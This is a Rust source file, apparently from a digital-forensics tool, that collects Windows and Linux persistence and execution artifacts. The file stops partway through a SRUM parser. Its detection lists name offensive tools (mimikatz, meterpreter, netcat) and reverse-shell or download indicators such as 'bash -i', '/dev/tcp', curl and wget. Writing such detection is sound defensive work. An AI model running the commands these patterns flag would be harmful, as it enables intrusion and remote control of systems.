//! jockey Runtime — Forensic artifact carver
//!
//! Carves and parses forensic artifacts from the filesystem:
//! - Windows Prefetch files (`*.pf`)
//! - Windows LNK shortcut files (`*.lnk`)
//! - Windows Recycle Bin entries (`$RECYCLE.BIN`)
//! - Shellbag registry heuristics (represented as path stubs)
//! - Linux: bash/zsh history files, systemd unit files, cron entries
//!
//! All artifacts are returned as `serde_json::Value` records with SHA-256 hashes.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CarvedArtifact {
    /// Artifact category: prefetch, lnk, recycle_bin, history, cron, systemd_unit, etc.
    pub artifact_type: String,
    /// Absolute path to the artifact file
    pub path: String,
    /// File size in bytes
    pub size_bytes: u64,
    /// SHA-256 hash of the artifact file
    pub sha256: String,
    /// Last modified timestamp (RFC 3339)
    pub modified_at: Option<String>,
    /// Parsed metadata fields specific to artifact type
    pub metadata: serde_json::Value,
    /// Whether this artifact indicates potential malicious activity
    pub suspicious: bool,
    /// Human-readable reason if suspicious
    pub suspicious_reason: Option<String>,
}

/// Carve forensic artifacts of the given type from the given search path.
///
/// `artifact_type`: `"prefetch"`, `"lnk"`, `"recycle_bin"`, `"history"`, `"cron"`, `"systemd"`, `"all"`
/// `search_path`: root directory to scan (e.g. `"C:\\Windows\\Prefetch"` or `"/home"`)
pub fn carve_artifacts(
    artifact_type: &str,
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();

    match artifact_type.to_lowercase().as_str() {
        "prefetch" => {
            results.extend(carve_prefetch(search_path)?);
        }
        "lnk" => {
            results.extend(carve_lnk_files(search_path)?);
        }
        "recycle_bin" => {
            results.extend(carve_recycle_bin(search_path)?);
        }
        "history" => {
            results.extend(carve_shell_history(search_path)?);
        }
        "cron" => {
            results.extend(carve_cron_entries(search_path)?);
        }
        "systemd" => {
            results.extend(carve_systemd_units(search_path)?);
        }
        "all" => {
            results.extend(carve_prefetch(search_path).unwrap_or_default());
            results.extend(carve_lnk_files(search_path).unwrap_or_default());
            results.extend(carve_recycle_bin(search_path).unwrap_or_default());
            results.extend(carve_shell_history(search_path).unwrap_or_default());
            results.extend(carve_cron_entries(search_path).unwrap_or_default());
            results.extend(carve_systemd_units(search_path).unwrap_or_default());
        }
        _ => {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "status": "unknown_type",
                "artifact_type": artifact_type,
                "note": "Supported types: prefetch, lnk, recycle_bin, history, cron, systemd, all",
            }));
        }
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": artifact_type,
            "search_path": search_path,
            "status": "no_artifacts_found",
        }));
    }

    Ok(results)
}

/// Compute SHA-256 of a file (returns hex string, or "error:<msg>" on failure)
fn sha256_file(path: &Path) -> String {
    let bytes = match std::fs::read(path) {
        Ok(b) => b,
        Err(e) => return format!("error:{}", e),
    };
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    format!("{:x}", hasher.finalize())
}

/// Get modified time as RFC 3339 string
fn modified_at(path: &Path) -> Option<String> {
    path.metadata()
        .ok()
        .and_then(|m| m.modified().ok())
        .map(|t| {
            let secs = t
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0);
            chrono::DateTime::<chrono::Utc>::from_timestamp(secs as i64, 0)
                .map(|dt| dt.to_rfc3339())
                .unwrap_or_else(|| "unknown".to_string())
        })
}

/// Scan for Windows Prefetch files (*.pf)
/// On Linux/macOS this scans the provided path for any .pf files
pub fn carve_prefetch(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    let mut results = Vec::new();

    // Default to Windows Prefetch path
    let scan_path = if path.exists() {
        path.to_path_buf()
    } else {
        #[cfg(target_os = "windows")]
        {
            std::path::PathBuf::from("C:\\Windows\\Prefetch")
        }
        #[cfg(not(target_os = "windows"))]
        {
            return Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "prefetch",
                "status": "platform_note",
                "note": "Windows Prefetch files are not present on this OS. Scan a mounted Windows partition path to analyze prefetch files.",
            })]);
        }
    };

    if !scan_path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "prefetch",
            "status": "path_not_found",
            "search_path": scan_path.display().to_string(),
        })]);
    }

    for entry in walkdir_max_depth(&scan_path, 2) {
        if entry.extension().and_then(|e| e.to_str()) == Some("pf") {
            let sha256 = sha256_file(&entry);
            let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
            let name = entry
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();

            // Prefetch filenames are: "PROGRAMNAME-XXXXXXXX.pf"
            let (exec_name, hash_part) = parse_prefetch_name(&name);
            let suspicious = is_suspicious_prefetch(&exec_name);

            results.push(serde_json::to_value(CarvedArtifact {
                artifact_type: "prefetch".to_string(),
                path: entry.display().to_string(),
                size_bytes: size,
                sha256,
                modified_at: modified_at(&entry),
                metadata: serde_json::json!({
                    "executable_name": exec_name,
                    "prefetch_hash": hash_part,
                    "filename": name,
                }),
                suspicious,
                suspicious_reason: if suspicious {
                    Some("Prefetch file for known suspicious executable".to_string())
                } else {
                    None
                },
            })?);
        }
    }

    Ok(results)
}

fn parse_prefetch_name(name: &str) -> (String, String) {
    let without_ext = name.trim_end_matches(".pf");
    if let Some(dash_pos) = without_ext.rfind('-') {
        let exec_name = without_ext[..dash_pos].to_lowercase();
        let hash_part = without_ext[dash_pos + 1..].to_string();
        (exec_name, hash_part)
    } else {
        (without_ext.to_lowercase(), String::new())
    }
}

fn is_suspicious_prefetch(exec_name: &str) -> bool {
    const SUSPICIOUS_NAMES: &[&str] = &[
        "powershell",
        "cmd",
        "wscript",
        "cscript",
        "mshta",
        "regsvr32",
        "rundll32",
        "certutil",
        "bitsadmin",
        "wmic",
        "nc",
        "netcat",
        "mimikatz",
        "psexec",
        "meterpreter",
        "cobalt",
    ];
    SUSPICIOUS_NAMES.iter().any(|s| exec_name.contains(s))
}

/// Scan for Windows LNK shortcut files
pub fn carve_lnk_files(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "lnk",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }

    let mut results = Vec::new();
    for entry in walkdir_max_depth(path, 3) {
        if entry.extension().and_then(|e| e.to_str()) == Some("lnk") {
            let sha256 = sha256_file(&entry);
            let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
            let name = entry
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();

            // Parse LNK magic bytes: first 4 bytes should be 4C 00 00 00
            let is_valid_lnk = std::fs::read(&entry)
                .ok()
                .filter(|b| b.len() >= 4)
                .map(|b| b[0] == 0x4C && b[1] == 0x00 && b[2] == 0x00 && b[3] == 0x00)
                .unwrap_or(false);

            results.push(serde_json::to_value(CarvedArtifact {
                artifact_type: "lnk".to_string(),
                path: entry.display().to_string(),
                size_bytes: size,
                sha256,
                modified_at: modified_at(&entry),
                metadata: serde_json::json!({
                    "filename": name,
                    "valid_lnk_header": is_valid_lnk,
                }),
                suspicious: false,
                suspicious_reason: None,
            })?);
        }
    }
    Ok(results)
}

/// Scan Recycle Bin ($RECYCLE.BIN style entries)
pub fn carve_recycle_bin(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "recycle_bin",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }

    let mut results = Vec::new();
    for entry in walkdir_max_depth(path, 4) {
        let fname = entry
            .file_name()
            .map(|n| n.to_string_lossy().to_lowercase())
            .unwrap_or_default();
        // $I files are metadata files for recycle bin entries
        if fname.starts_with("$i") || fname.starts_with("$r") {
            let sha256 = sha256_file(&entry);
            let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
            let name_str = entry
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();

            results.push(serde_json::to_value(CarvedArtifact {
                artifact_type: "recycle_bin".to_string(),
                path: entry.display().to_string(),
                size_bytes: size,
                sha256,
                modified_at: modified_at(&entry),
                metadata: serde_json::json!({
                    "record_type": if fname.starts_with("$i") { "metadata" } else { "content" },
                    "filename": name_str,
                }),
                suspicious: false,
                suspicious_reason: None,
            })?);
        }
    }
    Ok(results)
}

/// Collect shell history files (Linux/macOS: ~/.bash_history, ~/.zsh_history, etc.)
pub fn carve_shell_history(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let history_files = [
        ".bash_history",
        ".zsh_history",
        ".sh_history",
        ".ash_history",
        ".fish_history",
    ];

    let base = Path::new(search_path);
    let mut results = Vec::new();

    // Scan per-user home dirs or single dir
    let dirs_to_check: Vec<std::path::PathBuf> = if base.is_dir() {
        // Check if it looks like /home — list subdirs
        if search_path.contains("home") || search_path == "/" {
            std::fs::read_dir(base)
                .map(|rd| {
                    rd.filter_map(|e| e.ok())
                        .filter(|e| e.path().is_dir())
                        .map(|e| e.path())
                        .collect()
                })
                .unwrap_or_default()
        } else {
            vec![base.to_path_buf()]
        }
    } else {
        vec![base.parent().unwrap_or(base).to_path_buf()]
    };

    for dir in &dirs_to_check {
        for hf in &history_files {
            let hpath = dir.join(hf);
            if hpath.is_file() {
                let sha256 = sha256_file(&hpath);
                let size = hpath.metadata().map(|m| m.len()).unwrap_or(0);
                // Read first 500 lines to keep evidence manageable
                let lines: Vec<String> = std::fs::read_to_string(&hpath)
                    .unwrap_or_default()
                    .lines()
                    .take(500)
                    .map(str::to_string)
                    .collect();

                let suspicious = lines.iter().any(|l| {
                    let lo = l.to_lowercase();
                    lo.contains("base64")
                        || lo.contains("wget")
                        || lo.contains("curl")
                        || lo.contains("nc ")
                        || lo.contains("/dev/tcp")
                        || lo.contains("chmod +x")
                        || lo.contains("python -c")
                        || lo.contains("perl -e")
                        || lo.contains("bash -i")
                });

                results.push(serde_json::to_value(CarvedArtifact {
                    artifact_type: "shell_history".to_string(),
                    path: hpath.display().to_string(),
                    size_bytes: size,
                    sha256,
                    modified_at: modified_at(&hpath),
                    metadata: serde_json::json!({
                        "history_file": hf,
                        "total_lines": lines.len(),
                        "entries": lines,
                    }),
                    suspicious,
                    suspicious_reason: if suspicious {
                        Some("Shell history contains potentially suspicious commands (base64/wget/netcat/reverse shell patterns)".to_string())
                    } else {
                        None
                    },
                })?);
            }
        }
    }
    Ok(results)
}

pub fn collect_autostart_entries(
    search_path: Option<&str>,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();

    let mut candidate_paths: Vec<std::path::PathBuf> = Vec::new();
    if let Some(path) = search_path {
        let p = std::path::Path::new(path);
        if p.exists() {
            candidate_paths.push(p.to_path_buf());
        }
    }

    let system_paths = [
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/zshrc",
        "/etc/rc.local",
        "/etc/crontab",
        "/etc/cron.d",
        "/etc/systemd/system",
    ];
    for path in system_paths {
        let p = std::path::Path::new(path);
        if p.exists() {
            candidate_paths.push(p.to_path_buf());
        }
    }

    if candidate_paths.is_empty() {
        return Ok(vec![serde_json::json!({
            "collector": "autostart",
            "status": "no_paths_found",
            "search_path": search_path,
        })]);
    }

    let suspicious_patterns = [
        "curl ",
        "wget ",
        "bash -i",
        "nc ",
        "/dev/tcp",
        "python -c",
        "base64",
        "chmod +x",
    ];

    for path in candidate_paths {
        if path.is_dir() {
            let Ok(entries) = std::fs::read_dir(&path) else {
                continue;
            };
            for entry in entries.flatten() {
                let p = entry.path();
                if p.is_file() {
                    let Ok(content) = std::fs::read_to_string(&p) else {
                        continue;
                    };
                    let lower = content.to_lowercase();
                    let matches: Vec<&str> = suspicious_patterns
                        .iter()
                        .copied()
                        .filter(|pattern| lower.contains(pattern))
                        .collect();
                    results.push(serde_json::json!({
                        "collector": "autostart",
                        "artifact_type": "autostart_entry",
                        "path": p.display().to_string(),
                        "sha256": sha256_file(&p),
                        "modified_at": modified_at(&p),
                        "line_count": content.lines().count(),
                        "indicators": matches,
                        "suspicious": !matches.is_empty(),
                    }));
                }
            }
            continue;
        }

        if !path.is_file() {
            continue;
        }

        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let lower = content.to_lowercase();
        let matches: Vec<&str> = suspicious_patterns
            .iter()
            .copied()
            .filter(|pattern| lower.contains(pattern))
            .collect();
        results.push(serde_json::json!({
            "collector": "autostart",
            "artifact_type": "autostart_entry",
            "path": path.display().to_string(),
            "sha256": sha256_file(&path),
            "modified_at": modified_at(&path),
            "line_count": content.lines().count(),
            "indicators": matches,
            "suspicious": !matches.is_empty(),
        }));
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "autostart",
            "status": "no_entries",
        }));
    }

    Ok(results)
}

/// Collect shell startup profile metadata without copying profile contents into evidence.
pub fn collect_shell_profiles(
    search_path: Option<&str>,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut candidates = Vec::new();
    if let Some(path) = search_path {
        let path = Path::new(path);
        if path.is_file() {
            candidates.push(path.to_path_buf());
        } else if path.is_dir() {
            candidates.extend(walkdir_max_depth(path, 2).into_iter().filter(|p| {
                matches!(
                    p.file_name().and_then(|name| name.to_str()),
                    Some(
                        ".profile"
                            | ".bash_profile"
                            | ".bashrc"
                            | ".zprofile"
                            | ".zshrc"
                            | "profile"
                            | "bash.bashrc"
                            | "zshrc"
                    )
                )
            }));
        }
    } else {
        for path in ["/etc/profile", "/etc/bash.bashrc", "/etc/zsh/zshrc"] {
            let path = Path::new(path);
            if path.is_file() {
                candidates.push(path.to_path_buf());
            }
        }
        for root in [Path::new("/etc/profile.d"), Path::new("/root")] {
            if root.is_dir() {
                candidates.extend(walkdir_max_depth(root, 2).into_iter().filter(|p| {
                    matches!(
                        p.file_name().and_then(|name| name.to_str()),
                        Some(".profile" | ".bash_profile" | ".bashrc" | ".zprofile" | ".zshrc")
                    )
                }));
            }
        }
        if let Ok(home) = std::env::var("HOME") {
            let home = Path::new(&home);
            for name in [
                ".profile",
                ".bash_profile",
                ".bashrc",
                ".zprofile",
                ".zshrc",
            ] {
                let candidate = home.join(name);
                if candidate.is_file() {
                    candidates.push(candidate);
                }
            }
        }
        let homes = Path::new("/home");
        if let Ok(entries) = std::fs::read_dir(homes) {
            for home in entries
                .flatten()
                .map(|entry| entry.path())
                .filter(|path| path.is_dir())
            {
                for name in [
                    ".profile",
                    ".bash_profile",
                    ".bashrc",
                    ".zprofile",
                    ".zshrc",
                ] {
                    let candidate = home.join(name);
                    if candidate.is_file() {
                        candidates.push(candidate);
                    }
                }
            }
        }
    }
    candidates.sort();
    candidates.dedup();

    let mut records = Vec::new();
    for path in candidates {
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let active_lines: Vec<&str> = content
            .lines()
            .map(str::trim)
            .filter(|line| !line.is_empty() && !line.starts_with('#'))
            .collect();
        let lower = content.to_ascii_lowercase();
        let indicators = [
            ("dynamic_evaluation", "eval"),
            ("remote_download", "curl "),
            ("remote_download", "wget "),
            ("shell_execution", "bash -c"),
            ("network_utility", "nc "),
            ("path_modification", "path="),
        ]
        .iter()
        .filter_map(|(indicator, pattern)| lower.contains(pattern).then_some(*indicator))
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect::<Vec<_>>();
        records.push(serde_json::json!({
            "artifact_type": "shell_profile",
            "path": path.display().to_string(),
            "sha256": sha256_file(&path),
            "modified_at": modified_at(&path),
            "active_directive_count": active_lines.len(),
            "indicators": indicators,
        }));
    }

    if records.is_empty() {
        records.push(serde_json::json!({
            "collector": "shell_profiles",
            "status": "no_artifacts_found",
        }));
    }
    Ok(records)
}

/// Parse XDG autostart desktop entries without executing their commands.
pub fn collect_xdg_autostart_entries(
    search_path: Option<&str>,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut directories = Vec::new();
    if let Some(path) = search_path {
        let path = Path::new(path);
        if path.is_dir() {
            directories.push(path.to_path_buf());
        } else if path.is_file() {
            directories.push(path.parent().unwrap_or(Path::new(".")).to_path_buf());
        }
    } else {
        directories.extend([Path::new("/etc/xdg/autostart").to_path_buf()]);
        if let Ok(home) = std::env::var("HOME") {
            directories.push(Path::new(&home).join(".config/autostart"));
        }
        if let Ok(homes) = std::fs::read_dir("/home") {
            directories.extend(
                homes
                    .flatten()
                    .map(|entry| entry.path().join(".config/autostart")),
            );
        }
    }

    let mut records = Vec::new();
    for directory in directories.into_iter().filter(|path| path.is_dir()) {
        let Ok(entries) = std::fs::read_dir(&directory) else {
            continue;
        };
        for path in entries
            .flatten()
            .map(|entry| entry.path())
            .filter(|path| path.extension().and_then(|ext| ext.to_str()) == Some("desktop"))
        {
            let Ok(content) = std::fs::read_to_string(&path) else {
                continue;
            };
            let mut in_desktop_entry = false;
            let mut fields = serde_json::Map::new();
            for line in content.lines().map(str::trim) {
                if line.starts_with('[') && line.ends_with(']') {
                    in_desktop_entry = line == "[Desktop Entry]";
                } else if in_desktop_entry && !line.is_empty() && !line.starts_with('#') {
                    if let Some((key, value)) = line.split_once('=') {
                        if matches!(
                            key,
                            "Name"
                                | "Exec"
                                | "TryExec"
                                | "Hidden"
                                | "X-GNOME-Autostart-enabled"
                                | "Type"
                        ) {
                            fields.insert(
                                key.to_string(),
                                serde_json::Value::String(value.to_string()),
                            );
                        }
                    }
                }
            }
            records.push(serde_json::json!({
                "artifact_type": "xdg_autostart",
                "path": path.display().to_string(),
                "sha256": sha256_file(&path),
                "modified_at": modified_at(&path),
                "desktop_entry": fields,
            }));
        }
    }

    if records.is_empty() {
        records.push(serde_json::json!({
            "collector": "xdg_autostart",
            "status": "no_artifacts_found",
        }));
    }
    Ok(records)
}

/// Enumerate Windows scheduled-task metadata using read-only Task Scheduler queries.
pub fn collect_windows_scheduled_tasks(
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let output = std::process::Command::new("powershell")
            .args([
                "-NoLogo", "-NoProfile", "-NonInteractive", "-Command",
                "Get-ScheduledTask | Select-Object TaskName,TaskPath,State,Description,Principal,Actions,Triggers | ConvertTo-Json -Depth 7 -Compress",
            ])
            .output()?;
        if !output.status.success() {
            return Err(format!("Task Scheduler query failed with {}", output.status).into());
        }
        parse_powershell_records(&output.stdout, "scheduled_tasks")
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "scheduled_tasks",
            "status": "unsupported",
            "platform": std::env::consts::OS,
        })])
    }
}

/// Enumerate Windows WMI event filters, consumers, and bindings without running them.
pub fn collect_windows_wmi_subscriptions(
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let script = "$names=@('__EventFilter','CommandLineEventConsumer','ActiveScriptEventConsumer','__FilterToConsumerBinding'); $out=@(); foreach($n in $names){ $out += Get-CimInstance -Namespace root/subscription -ClassName $n -ErrorAction SilentlyContinue | Select-Object @{Name='Class';Expression={$n}}, * }; ConvertTo-Json -InputObject $out -Depth 7 -Compress";
        let output = std::process::Command::new("powershell")
            .args([
                "-NoLogo",
                "-NoProfile",
                "-NonInteractive",
                "-Command",
                script,
            ])
            .output()?;
        if !output.status.success() {
            return Err(format!("WMI subscription query failed with {}", output.status).into());
        }
        parse_powershell_records(&output.stdout, "wmi_subscriptions")
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "wmi_subscriptions",
            "status": "unsupported",
            "platform": std::env::consts::OS,
        })])
    }
}

#[cfg(target_os = "windows")]
fn parse_powershell_records(
    stdout: &[u8],
    collector: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let value: serde_json::Value = serde_json::from_slice(stdout)?;
    let records = match value {
        serde_json::Value::Array(records) => records,
        serde_json::Value::Null => Vec::new(),
        record => vec![record],
    };
    if records.is_empty() {
        return Ok(vec![serde_json::json!({
            "collector": collector,
            "status": "no_artifacts_found",
        })]);
    }
    Ok(records
        .into_iter()
        .map(|record| {
            serde_json::json!({
                "collector": collector,
                "record": record,
            })
        })
        .collect())
}

/// Collect cron job entries from system and user crontabs
pub fn carve_cron_entries(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "linux")]
    {
        carve_linux_cron()
    }
    #[cfg(not(target_os = "linux"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "cron",
            "status": "platform_note",
            "note": "Cron artifact carving is Linux-specific",
        })])
    }
}

#[cfg(target_os = "linux")]
fn carve_linux_cron() -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let cron_paths = [
        "/etc/crontab",
        "/etc/cron.d",
        "/var/spool/cron",
        "/var/spool/cron/crontabs",
    ];

    let mut results = Vec::new();

    for cron_path in &cron_paths {
        let path = Path::new(cron_path);
        if !path.exists() {
            continue;
        }

        let entries = if path.is_file() {
            vec![path.to_path_buf()]
        } else {
            std::fs::read_dir(path)
                .map(|rd| rd.filter_map(|e| e.ok()).map(|e| e.path()).collect())
                .unwrap_or_default()
        };

        for entry in entries {
            if !entry.is_file() {
                continue;
            }
            let content = std::fs::read_to_string(&entry).unwrap_or_default();
            let sha256 = sha256_file(&entry);
            let size = entry.metadata().map(|m| m.len()).unwrap_or(0);

            // Extract actual cron lines (non-comment, non-empty)
            let cron_lines: Vec<&str> = content
                .lines()
                .filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#'))
                .collect();

            let suspicious = cron_lines.iter().any(|l| {
                let lo = l.to_lowercase();
                lo.contains("wget")
                    || lo.contains("curl")
                    || lo.contains("nc ")
                    || lo.contains("base64")
                    || lo.contains("/tmp/")
                    || lo.contains("python -c")
                    || lo.contains("bash -i")
            });

            results.push(serde_json::to_value(CarvedArtifact {
                artifact_type: "cron".to_string(),
                path: entry.display().to_string(),
                size_bytes: size,
                sha256,
                modified_at: modified_at(&entry),
                metadata: serde_json::json!({
                    "cron_entries": cron_lines,
                    "entry_count": cron_lines.len(),
                }),
                suspicious,
                suspicious_reason: if suspicious {
                    Some("Cron entry contains suspicious command patterns".to_string())
                } else {
                    None
                },
            })?);
        }
    }
    Ok(results)
}

/// Collect systemd unit files (persistence mechanism on Linux)
pub fn carve_systemd_units(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "linux")]
    {
        let systemd_dirs = [
            "/etc/systemd/system",
            "/lib/systemd/system",
            "/usr/lib/systemd/system",
            "/run/systemd/system",
        ];

        let mut results = Vec::new();
        for dir_str in &systemd_dirs {
            let dir = Path::new(dir_str);
            if !dir.exists() {
                continue;
            }

            for entry in walkdir_max_depth(dir, 2) {
                let ext = entry.extension().and_then(|e| e.to_str());
                if !matches!(
                    ext,
                    Some("service") | Some("timer") | Some("socket") | Some("path")
                ) {
                    continue;
                }

                let content = std::fs::read_to_string(&entry).unwrap_or_default();
                let sha256 = sha256_file(&entry);
                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);

                // Extract ExecStart for suspicious command detection
                let exec_start: Vec<&str> = content
                    .lines()
                    .filter(|l| l.trim_start().starts_with("ExecStart="))
                    .collect();

                let suspicious = exec_start.iter().any(|l| {
                    let lo = l.to_lowercase();
                    lo.contains("/tmp/")
                        || lo.contains("wget")
                        || lo.contains("curl")
                        || lo.contains("nc ")
                        || lo.contains("base64")
                        || lo.contains("python -c")
                        || lo.contains("bash -i")
                });

                results.push(serde_json::to_value(CarvedArtifact {
                    artifact_type: "systemd_unit".to_string(),
                    path: entry.display().to_string(),
                    size_bytes: size,
                    sha256,
                    modified_at: modified_at(&entry),
                    metadata: serde_json::json!({
                        "unit_type": entry.extension().and_then(|e| e.to_str()).unwrap_or("unknown"),
                        "exec_start": exec_start,
                    }),
                    suspicious,
                    suspicious_reason: if suspicious {
                        Some("Systemd unit ExecStart contains suspicious command".to_string())
                    } else {
                        None
                    },
                })?);
            }
        }
        Ok(results)
    }
    #[cfg(not(target_os = "linux"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "systemd_unit",
            "status": "platform_note",
            "note": "Systemd unit carving is Linux-specific",
        })])
    }
}

/// Simple directory walker limited to max_depth (avoids pulling in walkdir crate)
fn walkdir_max_depth(dir: &Path, max_depth: usize) -> Vec<std::path::PathBuf> {
    let mut results = Vec::new();
    walk_recursive(dir, 0, max_depth, &mut results);
    results
}

fn walk_recursive(dir: &Path, depth: usize, max_depth: usize, out: &mut Vec<std::path::PathBuf>) {
    if depth > max_depth {
        return;
    }
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.filter_map(|e| e.ok()) {
        let path = entry.path();
        if path.is_file() {
            out.push(path);
        } else if path.is_dir() && depth < max_depth {
            walk_recursive(&path, depth + 1, max_depth, out);
        }
    }
}

#[cfg(target_os = "windows")]
pub fn is_elevated() -> bool {
    #[link(name = "shell32")]
    extern "system" {
        fn IsUserAnAdmin() -> i32;
    }
    unsafe { IsUserAnAdmin() != 0 }
}

#[cfg(not(target_os = "windows"))]
pub fn is_elevated() -> bool {
    std::process::Command::new("id")
        .arg("-u")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "0")
        .unwrap_or(false)
}

/// Windows Amcache.hve parser
pub fn carve_amcache(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let target_path = if _search_path == "." || _search_path.is_empty() {
            r"C:\Windows\AppCompat\Programs\Amcache.hve".to_string()
        } else {
            _search_path.to_string()
        };
        let path = Path::new(&target_path);
        if !path.exists() {
            return Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "amcache",
                "status": "path_not_found",
                "path": target_path,
            })]);
        }

        let meta = match std::fs::metadata(path) {
            Ok(m) => m,
            Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
                let elevated = is_elevated();
                return Ok(vec![serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "amcache",
                    "status": if elevated { "partial" } else { "requires_elevation" },
                    "path": target_path,
                    "reason": if elevated { "Amcache hive locked by OS" } else { "Amcache.hve access requires Administrator privileges" },
                    "required_privilege": "Administrator",
                })]);
            }
            Err(e) => return Err(e.into()),
        };

        let size = meta.len();
        let modified = meta.modified().ok().map(|t| {
            let dt: chrono::DateTime<chrono::Utc> = t.into();
            dt.to_rfc3339()
        });

        match std::fs::File::open(path) {
            Ok(mut file) => {
                use std::io::Read;
                let mut buf = [0u8; 64];
                let n = file.read(&mut buf).unwrap_or(0);
                let is_hive = n >= 4 && &buf[0..4] == b"regf";
                let sha256 = sha256_file(path);
                Ok(vec![serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "amcache",
                    "status": "success",
                    "path": target_path,
                    "size_bytes": size,
                    "modified_at": modified,
                    "is_valid_hive": is_hive,
                    "sha256": sha256,
                    "note": "Amcache registry hive inspected successfully",
                })])
            }
            Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
                let elevated = is_elevated();
                Ok(vec![serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "amcache",
                    "status": if elevated { "partial" } else { "requires_elevation" },
                    "path": target_path,
                    "size_bytes": size,
                    "modified_at": modified,
                    "reason": if elevated { "Amcache hive is exclusively locked by the OS runtime" } else { "Amcache.hve access requires Administrator privileges" },
                    "required_privilege": "Administrator",
                })])
            }
            Err(e) => Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "amcache",
                "status": "failed",
                "path": target_path,
                "error": e.to_string(),
            })]),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "amcache",
            "status": "platform_note",
            "note": "Amcache is a Windows-specific forensic artifact",
        })])
    }
}

/// Windows SRUM database parser
pub fn carve_srum(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let target_path = if _search_path == "." || _search_path.is_empty() {
            r"C:\Windows\System32\sru\SRUDB.dat".to_string()
        } else {
            _search_path.to_string()
        };
        let path = Path::new(&target_path);
        if !path.exists() {
            return Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "srum",
                "status": "path_not_found",
                "path": target_path,
            })]);
        }

        let meta = match std::fs::metadata(path) {
            Ok(m) => m,
            Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
                let elevated = is_elevated();
                return Ok(vec![serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "srum",
                    "status": if elevated { "partial" } else { "requires_elevation" },
                    "path": target_path,
                    "reason": if elevated { "SRUM database locked by Diagnostic Policy Service" } else { "SRUDB.dat access requires Administrator privileges" },
                    "required_privilege": "Administrator",
                })]);
            }
            Err(e) => return Err(e.into()),
        };

        let size = meta.len();
        let modified = meta.modified().ok().map(|t| {
            let dt: chrono::DateTime<chrono::Utc> = t.into();
            dt.to_rfc3339()
        });

        match std::fs::File::open(path) {
            Ok(mut file) => {
                use std::io::Read;
                let mut buf = [0u8; 32];
                let n = file.read(&mut buf).unwrap_or(0);
                let is_ese = n >= 8 && buf[4..8] == [0xef, 0xcd, 0xab, 0x89];
                let sha256 = sha256_file(path);
